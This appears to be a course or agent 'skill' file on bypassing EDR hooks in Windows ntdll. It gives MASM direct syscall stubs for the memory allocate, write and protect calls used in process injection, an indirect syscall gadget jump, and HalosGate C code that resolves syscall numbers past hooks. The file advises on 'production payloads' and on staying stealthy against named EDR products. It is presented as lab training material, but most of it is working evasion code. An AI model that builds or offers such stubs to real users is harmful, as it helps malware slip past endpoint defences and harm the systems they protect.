# syscall-techniques

> **Status:** COMPLETE
> **Cluster:** 09-odpc
> **Maps to:** Chapter 20 (Direct Syscalls), Chapter 21 (Indirect Syscalls), Chapter 22 (Dynamic SSN Resolution / HalosGate)

## Description
Patterns for invoking Windows kernel services without going through EDR-hooked ntdll
user-land wrappers. Covers direct syscall MASM stubs, indirect syscall via a clean
`syscall` gadget in ntdll, and dynamic SSN resolution using HalosGate when the target
function is hooked.

Invoke when: implementing a syscall-based API call, generating stubs for a new function,
or debugging why a syscall stub is being caught.

## Why syscalls matter

EDRs instrument user-land APIs by placing hooks (usually a `jmp` to a trampoline) at the
start of ntdll functions like `NtAllocateVirtualMemory`. Syscall techniques bypass these
hooks by invoking the kernel directly:

- **Direct syscall:** your code contains the `syscall` instruction and the SSN — never
  passes through ntdll at all
- **Indirect syscall:** your code places the SSN in `eax`, then jumps to the `syscall`
  instruction *inside* ntdll — the call appears to originate from ntdll (better call stack)

## System Service Numbers (SSNs)

Every syscall has a number that maps to a kernel routine. SSNs change between Windows
builds. A stub hardcoded with the wrong SSN will crash or call the wrong function.

Clean ntdll stub layout (unhooked):
```asm
; NtAllocateVirtualMemory stub in ntdll (Windows 10 21H2 example)
4C 8B D1        mov r10, rcx        ; required calling convention
B8 18 00 00 00  mov eax, 0x18       ; SSN = 0x18 for this build
0F 05           syscall
C3              ret
```

A hooked stub replaces the first bytes with `E9 XX XX XX XX` (jmp to EDR hook).

## Direct syscall — MASM stub

Write a `.asm` file in your VS project (x64, MASM):

```asm
; syscalls.asm
.code

NtAllocateVirtualMemory PROC
    mov r10, rcx
    mov eax, 18h        ; hardcoded SSN — must be correct for target Windows build
    syscall
    ret
NtAllocateVirtualMemory ENDP

NtWriteVirtualMemory PROC
    mov r10, rcx
    mov eax, 3Ah
    syscall
    ret
NtWriteVirtualMemory ENDP

NtProtectVirtualMemory PROC
    mov r10, rcx
    mov eax, 50h
    syscall
    ret
NtProtectVirtualMemory ENDP

End
```

Declare in a header:
```c
extern "C" NTSTATUS NtAllocateVirtualMemory(
    HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits,
    PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
```

**Weakness:** SSN is hardcoded. Breaks if deployed to a different Windows build.
Use dynamic resolution (HalosGate) for production payloads.

## Indirect syscall — gadget jump

Instead of emitting `syscall` yourself, jump to the `syscall; ret` bytes inside ntdll.
The kernel sees the call originating from inside ntdll — better call stack legitimacy.

```c
// Find a clean syscall gadget in ntdll
PVOID FindSyscallGadget(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    // Scan .text section for: 0F 05 C3 (syscall; ret)
    LPBYTE pBase = (LPBYTE)hNtdll;
    // ... iterate sections, find .text, scan for pattern
    // Return address of first 0F 05 C3 found
}
```

Stub using indirect pattern:
```asm
; indirect_syscall.asm
; pSyscallGadget must be set before calling (global or thread-local)
EXTERN pSyscallGadget:QWORD

NtAllocateVirtualMemory_Indirect PROC
    mov r10, rcx
    mov eax, 18h        ; SSN
    jmp qword ptr [pSyscallGadget]  ; jump into ntdll's syscall gadget
NtAllocateVirtualMemory_Indirect ENDP
End
```

## HalosGate — dynamic SSN resolution

When the target ntdll stub is hooked, scan adjacent functions to calculate the SSN.
ntdll syscall stubs are contiguous in memory and SSNs are sequential.

```c
WORD GetSyscallNumber(LPCSTR funcName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    LPBYTE  pFunc  = (LPBYTE)GetProcAddress(hNtdll, funcName);

    // Check if hooked (first byte is E9 = jmp)
    if (pFunc[0] != 0xE9) {
        // Not hooked — read SSN directly from mov eax, <ssn>
        // Bytes: 4C 8B D1  B8 [lo] [hi] 00 00
        return *(WORD*)(pFunc + 4);
    }

    // Hooked — scan neighbours
    for (WORD i = 1; i < 500; i++) {
        // Check stub at +i * stub_size (stubs are ~32 bytes apart)
        LPBYTE pNeighbour = pFunc + (i * 32);
        if (pNeighbour[0] == 0x4C && pNeighbour[3] == 0xB8) {
            // Found clean stub; its SSN is target_SSN + i
            WORD neighbourSSN = *(WORD*)(pNeighbour + 4);
            return neighbourSSN - i;
        }
        pNeighbour = pFunc - (i * 32);
        if (pNeighbour[0] == 0x4C && pNeighbour[3] == 0xB8) {
            WORD neighbourSSN = *(WORD*)(pNeighbour + 4);
            return neighbourSSN + i;
        }
    }
    return 0;  // failed
}
```

Then store the resolved SSN before calling and pass it into the stub dynamically:

```c
WORD ssn = GetSyscallNumber("NtAllocateVirtualMemory");
// Write SSN into the stub at runtime (or use a trampoline that reads a global)
```

## SysWhispers3 vs manual stubs

| Approach | Pros | Cons |
|----------|------|------|
| SysWhispers3 (auto-generated) | Fast; handles multiple Windows versions; includes HalosGate by default | Generated patterns are now signatured by some EDRs; less control |
| Manual MASM stubs | Full control; can obfuscate stub layout; harder to signature | More work; SSN management is manual |

For ODPC: write manual stubs to understand the mechanics. SysWhispers3 for rapid
prototyping once the concept is understood.

## Gotchas

- **Wrong SSN = BSOD or wrong kernel call.** Always verify against a known-good ntdll on the target build.
- **Direct syscalls have no ntdll frame on the call stack.** Some EDRs detect this (unbacked syscall origin). Indirect syscalls are stealthier for CrowdStrike and MDE.
- **Stub size assumption in HalosGate.** Stubs are not exactly 32 bytes on all builds. More robust: parse the export table and sort by address to find adjacent functions.
- **MASM calling convention.** `mov r10, rcx` must be the first instruction — the kernel expects this.
- **32-bit syscall numbers differ.** `int 0x2E` vs `syscall`; completely different SSN table. x64 only in ODPC.

## Related skills

- `api-hashing-conventions` — use hash-based ntdll location instead of GetModuleHandle
- `edr-test-loop` — verify the syscall stub bypasses the target EDR
- `odpc-lab-setup` — x64dbg workflow for confirming SSN and verifying stubs
